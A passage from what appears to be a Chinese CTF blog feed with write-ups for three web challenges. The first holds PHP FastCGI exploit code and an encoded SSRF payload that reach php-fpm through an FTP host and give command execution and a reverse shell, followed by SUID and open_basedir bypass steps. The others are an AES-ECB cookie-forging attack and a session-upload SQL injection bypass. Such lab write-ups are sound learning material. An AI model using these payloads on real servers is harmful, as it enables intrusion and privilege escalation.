class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        fwrite($this->_sock, $request);</span><span class="token comment">//        do &#123;</span><span class="token comment">//            $resp = $this->readPacket();</span><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span><span class="token comment">//                $response .= $resp['content'];</span><span class="token comment">//            &#125;</span><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span><span class="token comment">//        var_dump($resp);</span><span class="token comment">//        if (!is_array($resp)) &#123;</span><span class="token comment">//            throw new Exception('Bad request');</span><span class="token comment">//        &#125;</span><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span><span class="token comment">//            case self::CANT_MPX_CONN:</span><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::OVERLOADED:</span><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::UNKNOWN_ROLE:</span><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span><span class="token comment">//                break;</span><span class="token comment">//            case self::REQUEST_COMPLETE:</span><span class="token comment">//                return $response;</span><span class="token comment">//        &#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// real exploit start here</span><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span><span class="token comment">//    die("Check your input\n");</span><span class="token comment">//&#125;</span><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span><span class="token comment">//    $filepath = __FILE__;</span><span class="token comment">//&#125;else&#123;</span><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span><span class="token comment">//&#125;</span><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span> <span class="token comment">// php payload -- Doesnt do anything</span><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span> <span class="token comment">//靶机fpm的监听端口</span>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($_REQUEST);</span><span class="token comment">// print_r($params);</span><span class="token comment">//echo "Call: $uri\n\n";</span><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;add_api.php?backdoor&#x3D;phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@1.2.3.4:7777&#x2F;1&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell成功</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200406543.png"></p><p>但权限还不够，需要提权，最常见的是suid提权</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920200510897.png"></p><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><blockquote><p>SUID可以让调用者以文件拥有者的身份运行该文件，所以利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了</p></blockquote><p>先查找有suid命令</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不知道为啥我这找不到</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201358479.png"></p><p>用张网上的图</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201437332.png"></p><p>说明<code>/usr/local/bin/php</code>是用root权限且具有suid的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201616574.png"></p><p>然后进入php交互，再利用chdir绕过open_basedir限制，读取flag。</p><pre class="line-numbers language-none"><code class="language-none">php -amkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(file_get_contents(&#39;&#x2F;flag&#39;));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/image-20210920201316794.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BSidesCF 2019]Mixer</title>
      <link href="/p/777913984.html"/>
      <url>/p/777913984.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[其实是密码题|AES]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920144020080.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>把is_admin的值改为1再登录，循循善诱的提示，感觉很不错呀。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920144049435.png"></p><p>可见还有user</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920144131816.png"></p><p>那接下来思路很明确，就是构造cookie。</p><p>但是这cookie解不掉啊！！</p><pre class="line-numbers language-none"><code class="language-none">f9c25c899ee18a3d59f24874eeefc0795af356dcb8af339901e5c1a42a7be3c2e3683292819ebe0c9fb44dc937807a5a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目录也都扫完了，没扫出什么。</p><p>百度搜了搜，原来是AES的ECB加密</p><p>随便改了个字符，报错</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920153805752.png"></p><p>要是运气好，能爆出这样的错</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920154152108.png"></p><p>这样就可以猜测出原字符串的json格式</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;paw&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>怪，网上的wp一会ecb一会cbc，把我整不会了。</p><h3 id="AES知识"><a href="#AES知识" class="headerlink" title="AES知识"></a>AES知识</h3><blockquote><p>在AES算法中，分组长度为128位=16字节</p></blockquote><p>于是将字符串分为五组</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;xxxx&quot;,&quot;is_admin&quot;:0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样cookie就为</p><pre class="line-numbers language-none"><code class="language-none">d47dc0d4e4e22731cc4f2b80b29f5e62d31c4db0fb75e4418d8b0dd8b28a57e6d22c55bf392d2519b39137f1bf97efa7a7bfdf5d0f47f4515e97cf003fc62b09d65a2c2a3358ea236b383b46a9d41161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">d47dc0d4e4e22731cc4f2b80b29f5e62d31c4db0fb75e4418d8b0dd8b28a57e6d22c55bf392d2519b39137f1bf97efa7a7bfdf5d0f47f4515e97cf003fc62b09d65a2c2a3358ea236b383b46a9d41161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后将第2组移到第5组之前，即</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;first_name&quot;:&quot;A&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">d47dc0d4e4e22731cc4f2b80b29f5e62d22c55bf392d2519b39137f1bf97efa7a7bfdf5d0f47f4515e97cf003fc62b09d31c4db0fb75e4418d8b0dd8b28a57e6d65a2c2a3358ea236b383b46a9d41161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">d47dc0d4e4e22731cc4f2b80b29f5e62d22c55bf392d2519b39137f1bf97efa7a7bfdf5d0f47f4515e97cf003fc62b09d31c4db0fb75e4418d8b0dd8b28a57e6d65a2c2a3358ea236b383b46a9d41161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而1.000000000000000=1</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Mixer/image-20210920160713348.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[PwnThyBytes 2019]Baby_SQL</title>
      <link href="/p/1361102643.html"/>
      <url>/p/1361102643.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[PHP_SESSION_UPLOAD_PROGRESS|if+substr盲注]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PwnThyBytes-2019-Baby-SQL/image-20210919185115444.png"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PwnThyBytes-2019-Baby-SQL/image-20210919185109284.png"></p><p>源码都是写成一行的形式</p><blockquote><p>and 前面都为假，后面就不执行</p><p>or  前面都为真，后面就不执行</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//no</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(a|d|m|i|n)/'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">OR</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">6</span> <span class="token keyword">OR</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span> <span class="token keyword">OR</span> <span class="token operator">!</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">AND</span> <span class="token variable">$con</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">AND</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not allowed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>奇怪，照理说按这条代码逻辑，username=admin,不会返回<code>Not allowed!</code></p><p>怪。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PwnThyBytes-2019-Baby-SQL/image-20210919201320146.png"></p><blockquote><p>在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()</p></blockquote><p>那思路就是执行session_start()绕过index.php的过滤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PwnThyBytes-2019-Baby-SQL/image-20210919202808381.png"></p><p>用<code>proxies</code>参数可设置代理，让bp抓python脚本的包。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8498ac9c-f8d3-49e4-be94-e4e8fd4df4cc.node4.buuoj.cn:81/templates/login.php"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"123456789"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"test1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                  proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功绕过了</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-PwnThyBytes-2019-Baby-SQL/image-20210919203849190.png"></p><p>碎碎念：太久没做sql注入都有丶忘记了，我要做的不是让username=一个正确的值而是让<code>where</code>后面的条件为真或假，所以直接<code>1&quot; or 1#</code>不就完了，非得搁着想着如何凑出正确的username，这都没有任何过滤随便注，还搁着想半天，该打该打。</p><p>跑脚本完事</p><p>库</p><pre class="line-numbers language-none"><code class="language-none">ptbctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表</p><pre class="line-numbers language-none"><code class="language-none">flag_tbl,ptbctf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>flag_tbl</code>表的字段名</p><pre class="line-numbers language-none"><code class="language-none">secret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数据</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;477ab0cc-9af4-4fef-ae60-22739668b94c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[羊城杯 2020]Blackcat</title>
      <link href="/p/1831754947.html"/>
      <url>/p/1831754947.html</url>
      
